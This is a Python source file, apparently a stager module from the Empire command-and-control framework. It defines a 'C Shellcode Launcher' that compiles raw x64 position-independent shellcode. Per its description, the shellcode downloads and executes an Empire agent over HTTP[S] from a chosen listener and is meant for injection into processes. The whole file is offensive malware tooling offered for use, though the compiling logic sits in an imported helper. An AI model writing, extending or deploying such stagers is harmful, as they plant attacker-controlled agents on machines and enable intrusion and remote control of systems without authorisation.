import logging

from empire.server.utils.shellcode_compiler import generate_pic_shellcode

log = logging.getLogger(__name__)


class Stager:
    def __init__(self, mainMenu):
        self.info = {
            "Name": "C Shellcode Launcher",
            "Authors": [
                {
                    "Name": "Anthony Rose",
                    "Handle": "@Cx01N",
                    "Link": "https://twitter.com/Cx01N_",
                },
            ],
            "Description": "Compiles a PIC (position-independent code) shellcode .bin that stages an Empire agent via HTTP[S]. Uses the same download-and-execute logic as c_launcher but outputs raw x64 shellcode suitable for injection.",
            "Comments": [""],
        }

        self.options = {
            "Listener": {
                "Description": "Listener to generate stager for.",
                "Required": True,
                "Value": "",
            },
            "Language": {
                "Description": "Language of the stager to generate.",
                "Required": True,
                "Value": "csharp",
                "SuggestedValues": [
                    "powershell",
                    "ironpython",
                    "csharp",
                ],
                "Strict": True,
            },
            "OutFile": {
                "Description": "Filename that should be used for the generated output.",
                "Required": True,
                "Value": "launcher.bin",
            },
        }

        self.mainMenu = mainMenu

    def generate(self):
        listener_name = self.options["Listener"]["Value"]
        language = self.options["Language"]["Value"]

        try:
            shellcode = generate_pic_shellcode(self.mainMenu, listener_name, language)
        except Exception as e:
            log.error(f"[!] Shellcode generation failed: {e}")
            return ""

        return shellcode
